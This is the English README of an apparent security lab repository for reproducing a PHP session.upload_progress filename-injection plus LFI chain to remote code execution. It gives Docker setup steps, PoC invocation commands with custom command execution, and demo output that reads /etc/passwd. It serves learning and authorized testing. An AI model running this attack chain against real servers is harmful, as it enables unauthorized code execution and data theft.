# php2shell-lab

> 🌐 **Language / 语言切换：** [English](README_EN.md) · [中文](README.md)

[![CI](https://img.shields.io/github/actions/workflow/status/kuwoo/php2shell-Lab/ci.yml?branch=main)](https://github.com/kuwoo/php2shell-Lab/actions)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![PHP](https://img.shields.io/badge/PHP-8.2.34-777BB4?logo=php&logoColor=white)](#)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)](#)
[![Python](https://img.shields.io/badge/Python-3.7%2B-3776AB?logo=python&logoColor=white)](#)
[![Stars](https://img.shields.io/github/stars/kuwoo/php2shell-Lab?style=social)](https://github.com/kuwoo/php2shell-Lab/stargazers)

A Docker-based local lab for reproducing and learning the first attack chain (**Chain A**) of the high-severity PHP vulnerability **php2shell** (CVE-2026-109618 / CVE-2026-109619):

> `session.upload_progress` filename injection + application Local File Inclusion (LFI) → Remote Code Execution (RCE)

Adapted from the public research [ikow/php2shell-poc](https://github.com/ikow/php2shell-poc). The code is deliberately written to be **minimal and heavily commented**, so you can learn while running it.

> 📖 This is the English (auxiliary) edition. The primary, most complete documentation is in Chinese — see [README.md](README.md), [docs/操作手册.md](docs/操作手册.md) (operation manual) and [docs/原理分析.md](docs/原理分析.md) (in-depth analysis). English mirrors: [docs/manual-en.md](docs/manual-en.md) and [docs/analysis-en.md](docs/analysis-en.md).

---

## ⚠️ Disclaimer (must read)

- This project is **for local labs, security learning, and authorized testing only**.
- Do **not** run `poc.py` against systems you are not authorized to test, and do not use this repository's payloads against any real target.
- This repository contains **only Chain A** (the application-layer LFI combination chain). It does **not** contain Chain B's UAF memory-corruption exploit (the original repo only has an ASAN verification script), nor any ready-made weaponized code for privilege escalation / reverse shells.
- You are fully responsible for your own actions.

---

## 1. Background in one sentence

| Item | Content |
|------|---------|
| Name | php2shell |
| CVE | CVE-2026-109618, CVE-2026-109619 |
| Type | Pre-authentication (pre-auth) Remote Code Execution (RCE) |
| Score | CVSS 4.0 **9.2 (Critical)** |
| Affected | PHP **5.4.0 – 8.5.11** |
| Fixed | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 (released 2026-10-21) |
| Root cause | PHP core's `session.upload_progress` handler |

> Detailed analysis: [docs/analysis-en.md](docs/analysis-en.md) (English) / [docs/原理分析.md](docs/原理分析.md) (Chinese).

---

## 2. Quick start (three steps)

```bash
# 1. Build and start the lab (single service, port 8082)
docker compose up -d --build

# 2. Run the PoC (default runs the "showcase payload": proves command execution + identity + system info + file read)
python poc.py --target http://localhost:8082

# 3. Run a single custom command
python poc.py --target http://localhost:8082 --cmd "id"
```

Seeing `uid=33(www-data)` in the output means the reproduction succeeded.

---

## 3. Demo output

`python poc.py --target http://localhost:8082` prints:

```
[1] injected, session file should be /tmp/sessions/sess_xxxxxxxxxxxxxxxxxxxxxxxxxx
[2] LFI include & execute: http://localhost:8082/index.php?page=/tmp/sessions/sess_xxx

uid=33(www-data) gid=33(www-data) groups=33(www-data)
=== WHOAMI ===
www-data
=== UNAME ===
Linux a3ab81efaa32 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux
=== PASSWD ===
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

`--cmd "whoami"` prints:

```
www-data
```

> Note: php2shell gives you the **web user (www-data)**, **not root**. Going from www-data to root requires a separate local privilege-escalation, which is a different class of problem and out of scope here (see [docs/analysis-en.md](docs/analysis-en.md)).

---

## 4. Directory structure

```
.
├── app/
│   └── index.php          # Deliberately vulnerable app: contains an LFI endpoint (the Chain A prerequisite)
├── docs/
│   ├── 操作手册.md          # Hand-holding operation manual (Chinese)
│   ├── 原理分析.md          # In-depth analysis (Chinese)
│   ├── manual-en.md       # Operation manual (English)
│   └── analysis-en.md     # In-depth analysis (English)
├── Dockerfile             # Pinned to the vulnerable php:8.2.34-apache
├── docker-compose.yml     # Defines the single php2shell service (8082)
├── php.ini                # Lab-specific config (upload_progress on, cleanup off, fixed session dir)
├── poc.py                 # Chain A PoC (showcase payload + --cmd)
├── README.md              # Primary README (Chinese)
└── README_EN.md           # English README (this file)
```

---

## 5. Documentation

| Document | For whom | Contents |
|----------|----------|----------|
| [docs/操作手册.md](docs/操作手册.md) / [docs/manual-en.md](docs/manual-en.md) | People who want to run it first | Requirements → start → reproduce → customize → stop/cleanup → FAQ |
| [docs/原理分析.md](docs/原理分析.md) / [docs/analysis-en.md](docs/analysis-en.md) | People who want to understand the internals | Prerequisites → root cause → Chain A step-by-step → three chains compared → detection & mitigation |

---

## 6. Principle in 30 seconds

```
The attacker uploads a file and injects PHP code into the "filename"
        ↓
PHP's session.upload_progress writes the filename verbatim into the session file
        ↓
The attacker fixes the session ID via PHPSESSID in the POST body (bypassing use_only_cookies)
        ↓
The target app has an LFI and includes that session file
        ↓
The PHP code in the session file executes → RCE
```

Key points:
1. **The filename is not filtered** → PHP writes it into the session file as plain text; your `<?php ... ?>` "lurks" there;
2. **`PHPSESSID` can be sent in the POST body** → bypasses `session.use_only_cookies=1`, so the attacker can predict the session file path;
3. **The app has an LFI** → when it includes the session file, PHP parses and executes the `<?php ... ?>` inside.

---

## 7. FAQ (short)

| Question | Answer |
|----------|--------|
| Port already in use? | Change `8082:80` in `docker-compose.yml`, or `docker compose down` and retry. See the manual |
| Build fails with `/app not found`? | The `app/` directory was deleted; confirm `app/index.php` exists, then re-run `--build` |
| Garbled Chinese output? | The Windows terminal is GBK; run `chcp 65001` first, see the manual |
| Want line breaks in the browser? | Replace `PHP_EOL` with `<br>` or wrap output in `<pre>`, see the manual |
| Can I get root directly? | No. php2shell gives www-data; privilege escalation is a separate issue, see the analysis |

---

## 8. References

- [ikow/php2shell-poc](https://github.com/ikow/php2shell-poc) — original public research (three attack chains + ASAN verification)
- CVE-2026-109618 / CVE-2026-109619 official advisories and the PHP fix commits

---

## 9. License

This project is licensed under the [MIT License](LICENSE), Copyright (c) 2026 ronins.
